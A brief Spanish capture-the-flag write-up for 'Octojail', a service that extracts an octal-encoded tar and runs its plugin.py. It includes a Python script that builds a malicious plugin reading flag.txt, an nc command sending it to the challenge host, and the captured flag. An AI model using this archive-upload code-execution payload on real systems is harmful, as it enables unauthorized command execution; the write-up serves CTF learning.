# Octojail

El programa recibe un archivo tar en octal, extrae su contenido en `/uploads` y luegoe ejecuta la funcion `run` en `/uploads/plugin.py` si existe el fichero.

Podemos crear un script para que genere un archivo de texto en octal del tar con la carga util:
``` py
import os

os.system('echo "import subprocess\\n\\ndef run():\\n    l = subprocess.run([\'/bin/cat\', \'flag.txt\'])" > plugin.py')

os.system('tar cf plugin.tar plugin.py')

with open("plugin.tar", "rb") as f:
    data = f.read()

octal = ''.join(f'{byte:03o}' for byte in data)

with open("octal.txt", "w+") as f:
    f.write(octal)
```

Luego pasarselo con: `nc ctf.ac.upt.ro port < octal.txt`

`ctf{0331641fadb35abb1eb5a9640fa6156798cba4538148ceb863dfb1821ac69000}`

